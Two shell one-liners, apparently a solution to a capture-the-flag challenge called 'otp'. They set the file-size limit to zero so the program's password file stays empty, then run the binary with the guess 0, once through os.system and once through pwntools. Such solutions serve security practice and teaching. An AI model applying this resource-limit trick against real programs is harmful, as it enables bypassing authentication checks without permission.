ulimit -f 0 && python -c "import os; os.system('./otp 0')"
ulimit -f 0 && python -c "from pwn import *; p = process(argv=['./otp', '0']); print p.recvall()"